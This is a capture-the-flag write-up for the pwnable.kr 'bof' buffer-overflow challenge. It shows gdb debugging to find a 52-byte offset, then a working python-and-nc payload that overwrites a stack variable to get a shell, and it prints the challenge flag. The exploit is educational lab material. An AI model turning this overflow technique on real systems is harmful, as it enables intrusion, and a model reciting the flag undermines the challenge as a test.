# bof

![](http://pwnable.kr/img/bof.png)

# Problem

> Nana told me that buffer overflow is one of the most common software vulnerability. 
> Is that true?
> 
> Download : http://pwnable.kr/bin/bof
> Download : http://pwnable.kr/bin/bof.c
> 
> Running at : nc pwnable.kr 9000

# Play

After deassemble `bof`, found it enabled stack protection, thus we compile and debug in the following way.

```
$ gcc -g -m32 bof.c -fstack-protector
$ gdb a.out
(gdb) b 8
Breakpoint 1 at 0x8048532: file bof.c, line 8.
(gdb) r
Starting program: /home/delta/tmp/a.out
overflow me : XXXXXXXXXXXXXXXXXXXXXXXXXXXXXX

Breakpoint 1, func (key=-559038737) at bof.c:8
8               if(key == 0xcafebabe){
    (gdb) x/20x overflowme
    0xffffc7ec:     0x58585858      0x58585858      0x58585858      0x58585858
    0xffffc7fc:     0x58585858      0x58585858      0x58585858      0xff005858
    0xffffc80c:     0x86525300      0xffffcb04      0x0000002f      0xffffc838
    0xffffc81c:     0x0804858f      0xdeadbeef      0xffffc8e4      0xffffc8ec
    0xffffc82c:     0xf7e405ad      0xf7fb73c4      0xffffc850      0x00000000
```

As we can see, `0xdeadbeef` is 52 bytes away from `&overflowme`.
Thus we need to overwrite 52bytes after `overflowme` to `0xcafebabe`.

# Flag

```
$ (python -c 'print "X"*52+"\xbe\xba\xfe\xca"';cat) | nc pwnable.kr 9000
cat flag
daddy, I just pwned a buFFer :)
```
